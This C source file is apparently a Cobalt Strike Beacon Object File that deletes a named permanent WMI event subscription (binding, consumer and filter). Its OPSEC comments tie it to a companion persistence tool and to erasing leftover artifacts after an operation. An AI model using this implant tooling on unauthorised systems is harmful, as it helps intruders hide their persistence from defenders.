/*
 * wmi_clear.c — remove a permanent WMI event subscription by name.
 * Deletes in reverse order: __FilterToConsumerBinding, consumer(s),
 * __EventFilter. Match on ANY consumer class carrying the name.
 *
 * args: str subName
 *
 * OPSEC: same-process COM as wmi-sub; DeleteInstance per object. Run
 * persist-inventory afterwards to confirm zero leftovers (a cleared binding
 * with a live consumer is a half-artifact).
 */
#define CINTERFACE 1
#define COBJMACROS 1
#include <windows.h>
#include <objbase.h>
#include <wbemcli.h>
#include "beacon.h"

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, void*, DWORD);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantClear(VARIANTARG*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT int     __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, const char*, int, wchar_t*, int);

static const GUID kLocCls  = { 0x4590f811, 0x1d3a, 0x11d0, { 0x89,0x1f, 0x00,0xaa, 0x00,0x4b, 0x2e,0x24 } };
static const GUID kLocIid  = { 0xdc12a687, 0x737f, 0x11cf, { 0x88,0x4d, 0x00,0xaa, 0x00,0x4b, 0x2e,0x24 } };
static const GUID kSvcIid  = { 0xb81142ae, 0x5da6, 0x11d2, { 0xbb,0xd0, 0x00,0x10, 0x4b,0xcc, 0x4b,0x4c } };

/* delete one instance; TRUE on success, FALSE if not-found or failed */
static BOOL DelOne(IWbemServices* svc, wchar_t* path)
{
    HRESULT hr = IWbemServices_DeleteInstance(svc, path, 0, NULL, NULL);
    if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] deleted: %ws\n", path);
        return TRUE;
    }
    if (hr == WBEM_E_NOT_FOUND) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] absent: %ws\n", path);
        return TRUE;
    }
    BeaconPrintf(CALLBACK_ERROR, "[-] delete %ws failed hr=0x%08lx\n", path, (unsigned long)hr);
    return FALSE;
}

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    char* nameA = BeaconDataExtract(&p, NULL);
    if (!nameA || !*nameA) {
        BeaconPrintf(CALLBACK_ERROR, "usage: wmi-clear <subName>\n");
        return;
    }

    wchar_t nameW[128];
    if (!KERNEL32$MultiByteToWideChar(CP_UTF8, 0, nameA, -1, nameW, 128)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] wide conversion failed\n");
        return;
    }

    wchar_t binding[256], consumer1[256], consumer2[256], filter[256];
    MSVCRT$swprintf(binding,   256, L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"%ws\\\"\",Consumer=\"__CommandLineEventConsumer.Name=\\\"%ws\\\"\"", nameW, nameW);
    MSVCRT$swprintf(consumer1, 256, L"__CommandLineEventConsumer.Name=\"%ws\"", nameW);
    MSVCRT$swprintf(consumer2, 256, L"__ActiveScriptEventConsumer.Name=\"%ws\"", nameW);
    MSVCRT$swprintf(filter,    256, L"__EventFilter.Name=\"%ws\"", nameW);

    HRESULT hr;
    IWbemLocator*  pLoc = NULL;
    IWbemServices* pSvc = NULL;

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx failed hr=0x%08lx\n", (unsigned long)hr);
        return;
    }
    hr = OLE32$CoCreateInstance(&kLocCls, NULL, CLSCTX_INPROC_SERVER, &kLocIid, (void**)&pLoc);
    if (FAILED(hr) || !pLoc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance(WbemLocator) hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }
    hr = IWbemLocator_ConnectServer(pLoc, L"ROOT\\subscription", NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    if (FAILED(hr) || !pSvc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ConnectServer hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }
    OLE32$CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    DelOne(pSvc, binding);
    DelOne(pSvc, consumer1);
    DelOne(pSvc, consumer2);
    DelOne(pSvc, filter);

out:
    if (pSvc) pSvc->lpVtbl->Release(pSvc);
    if (pLoc) pLoc->lpVtbl->Release(pLoc);
    OLE32$CoUninitialize();
}